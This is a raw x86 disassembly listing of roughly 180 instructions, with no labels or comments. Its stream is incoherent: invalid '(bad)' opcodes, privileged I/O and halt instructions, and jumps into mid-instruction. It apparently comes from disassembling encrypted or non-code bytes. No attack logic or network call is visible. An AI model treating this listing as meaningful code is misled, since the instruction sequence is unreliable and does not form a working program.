  428391:	cs aam 0x4f
  428394:	(bad)  
  428395:	(bad)  
  428397:	inc    esi
  428398:	and    BYTE PTR fs:[ebx+eax*2],ch
  42839c:	and    BYTE PTR [esi],dl
  42839e:	fwait
  42839f:	mov    edi,0x342cfe89
  4283a4:	dec    ecx
  4283a5:	pop    edx
  4283a6:	(bad)  
  4283a7:	xor    ch,BYTE PTR [edi]
  4283a9:	pop    ebx
  4283aa:	pop    esi
  4283ab:	and    eax,0xca72f16e
  4283b0:	cwde   
  4283b1:	loop   0x4283bc
  4283b3:	xor    BYTE PTR [eax+edi*2],ch
  4283b6:	out    dx,eax
  4283b7:	jbe    0x42839d
  4283b9:	sub    DWORD PTR [ebp+0x54],0x21
  4283bd:	les    ebp,FWORD PTR [esi-0x2d]
  4283c0:	loope  0x4283e3
  4283c2:	rol    DWORD PTR [edx+eax*2],0x19
  4283c6:	mov    edi,0x3f44455d
  4283cb:	add    al,0x99
  4283cd:	mov    ch,0x6
  4283cf:	sub    eax,0x976abb19
  4283d4:	push   cs
  4283d5:	rol    esi,cl
  4283d7:	loopne 0x42836d
  4283d9:	pop    ds
  4283da:	fist   WORD PTR [eax]
  4283dc:	mov    ds:0x57240b3d,eax
  4283e1:	test   BYTE PTR [eax],bl
  4283e3:	inc    edx
  4283e4:	in     eax,0x33
  4283e6:	dec    dh
  4283e8:	mov    eax,0xa4f783a
  4283ed:	imul   DWORD PTR [ecx]
  4283ef:	cmp    BYTE PTR [ebx],ch
  4283f1:	sahf   
  4283f2:	arpl   WORD PTR [ebx],sp
  4283f4:	adc    al,0x26
  4283f6:	or     esi,ebp
  4283f8:	js     0x4283f8
  4283fa:	xchg   BYTE PTR ss:[ebp+0x6c],dh
  4283fe:	cli    
  4283ff:	xchg   ebx,eax
  428400:	xor    DWORD PTR [esi+edi*1+0x260e31bc],esp
  428407:	out    0xb9,al
  428409:	sbb    eax,DWORD PTR [ebx+0x76]
  42840c:	hlt    
  42840d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42840e:	inc    ecx
  42840f:	enter  0x7493,0x8b
  428413:	pushf  
  428414:	or     BYTE PTR ds:0xaa4dd6d1,0xdf
  42841b:	xor    BYTE PTR [edx-0x57c5b7fd],ch
  428421:	xchg   ebx,eax
  428422:	pop    ecx
  428423:	dec    esp
  428424:	retf   0x1205
  428427:	cmp    eax,0x9ed74fdc
  42842c:	inc    ecx
  42842d:	fnstsw ax
  42842f:	adc    BYTE PTR [ebx-0x4b],dh
  428432:	cmp    dh,BYTE PTR [ebx-0x6]
  428435:	jle    0x4284ae
  428437:	mov    edx,0xfd7fb5cc
  42843c:	pop    edx
  42843d:	inc    edi
  42843e:	scas   al,BYTE PTR es:[edi]
  42843f:	xchg   esi,eax
  428440:	in     al,dx
  428441:	mov    eax,ds:0x9301ad8
  428446:	div    BYTE PTR [ecx-0x28eed84f]
  42844c:	aas    
  42844d:	sbb    bl,BYTE PTR [esi+0xcad3ab1]
  428453:	jb     0x42843d
  428455:	retf   
  428456:	xor    bh,BYTE PTR [edx]
  428458:	addr16 (bad) 
  42845a:	f2xm1  
  42845c:	and    BYTE PTR [edi+ebx*1+0x31],0xd3
  428461:	jge    0x4284c6
  428463:	je     0x428483
  428465:	lds    eax,FWORD PTR [ecx]
  428467:	inc    eax
  428468:	or     eax,0xe87b2fa
  42846d:	outs   dx,DWORD PTR ds:[esi]
  42846e:	scas   al,BYTE PTR es:[edi]
  42846f:	pushf  
  428470:	dec    esi
  428471:	(bad)  
  428472:	out    dx,eax
  428473:	outs   dx,BYTE PTR ds:[esi]
  428474:	jl     0x4284ce
  428476:	push   0x5501d3c6
  42847b:	xor    dh,dl
  42847d:	lea    esp,[ebx]
  42847f:	imul   ebp,edi,0xd1ac1293
  428485:	mov    edx,0x35fe121d
  42848a:	xchg   ebx,eax
  42848b:	or     al,0xe6
  42848d:	jae    0x428509
  42848f:	and    BYTE PTR [eax-0x4a],0x15
  428493:	addr16 push ss
  428495:	in     al,0x55
  428497:	xchg   ebx,eax
  428498:	pop    edx
  428499:	xchg   ecx,eax
  42849a:	add    eax,0x2890e231
  42849f:	push   ss
  4284a0:	mov    ebx,0x5b5e924a
  4284a5:	and    BYTE PTR [ecx+edx*4-0xca9e734],ah
  4284ac:	pusha  
  4284ad:	and    DWORD PTR [esi-0x805c392],edx
  4284b3:	xchg   esp,eax
  4284b4:	sar    BYTE PTR [eax-0x2687e776],0x15
  4284bb:	dec    esi
  4284bc:	outs   dx,BYTE PTR ds:[esi]
  4284bd:	sub    BYTE PTR [ecx],0x4a
  4284c0:	push   esp
  4284c1:	into   
  4284c2:	cmp    esi,esi
  4284c4:	data16 hlt 
  4284c6:	and    BYTE PTR [ebx],cl
  4284c8:	je     0x428509
  4284ca:	mov    dh,BYTE PTR [edx]
  4284cc:	jl     0x4284c5
  4284ce:	aad    0x8f
  4284d0:	in     al,0x22
  4284d2:	(bad)  
  4284d3:	mov    edx,0xb2667609
  4284d8:	mul    DWORD PTR [edx-0x1dc1402c]
  4284de:	lds    ax,DWORD PTR [ebp-0x462704b1]
  4284e5:	ja     0x428566
  4284e7:	aad    0xf0
  4284e9:	cmp    bh,BYTE PTR [edx]
  4284eb:	xchg   edx,eax
  4284ec:	mov    ebx,0xeede90d0
  4284f1:	mov    dl,0xeb
  4284f3:	ins    DWORD PTR es:[edi],dx
  4284f4:	leave  
  4284f5:	aad    0x6c
  4284f7:	jmp    0xdc2d167c
  4284fc:	jbe    0x428538
  4284fe:	xor    BYTE PTR [esi+0x79ada980],ch
  428504:	jb     0x4284e6
  428506:	adc    eax,0x9d6ef367
  42850b:	int3   
  42850c:	fimul  WORD PTR [edx]
  42850e:	int3   
  42850f:	adc    esp,DWORD PTR [esi]
  428511:	nop
  428512:	mov    ebp,0xc41d65fa
  428517:	imul   ecx,DWORD PTR [edx],0x8a182efc
  42851d:	and    eax,0x608dc36d
  428522:	rcr    al,0xc3
  428525:	xchg   BYTE PTR [ecx-0x484f5447],al
  42852b:	gs lahf 
  42852d:	or     BYTE PTR [ecx],bl
  42852f:	rcr    DWORD PTR [edi+0x558991ea],1
  428535:	inc    ecx
  428536:	rcl    BYTE PTR [esi-0x272fc2ec],cl
  42853c:	mov    edx,0xb0c13f84
  428541:	aam    0xec
  428543:	fwait
  428544:	push   esi
  428545:	(bad)  
  428546:	ror    DWORD PTR [ebx],1
  428548:	out    dx,eax
  428549:	lahf   
  42854a:	and    eax,0xb832296f
  42854f:	inc    edx
  428550:	dec    edx
  428551:	jb     0x428584
  428553:	and    BYTE PTR [esi+0x70],cl
  428556:	pop    edi
  428557:	mov    ah,0xe4
  428559:	ja     0x4284e5
  42855b:	add    DWORD PTR [eax],eax
	...
